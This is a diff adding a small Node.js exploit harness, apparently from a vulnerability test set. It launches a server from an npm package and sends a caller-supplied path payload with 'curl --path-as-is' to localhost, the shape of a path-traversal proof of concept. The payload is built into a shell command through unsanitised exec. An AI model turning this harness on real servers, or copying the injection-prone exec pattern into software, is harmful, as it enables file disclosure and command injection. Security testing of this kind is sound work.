@@ -1,0 +1,25 @@
+function exploitFunction(payload) {
+    const { exec } = require("child_process");
+    const sleep = require("sleep");
+
+    // Start the server
+    let server = "node ./node_modules/zhangranbigman/run.js";
+    let exe = exec(server, (error, stdout) => {});
+
+    // Wait for the server to start
+    sleep.sleep(2);
+
+    // Define the attack string
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:9999${payload}"`;
+
+    // Execute the attack string
+    exec(attack_string, (error, stdout) => {
+        if (error) {
+            console.error(`Error executing attack: ${error}`);
+            return;
+        }
+        return stdout;
+    });
+}
+
+module.exports = { exploitFunction };
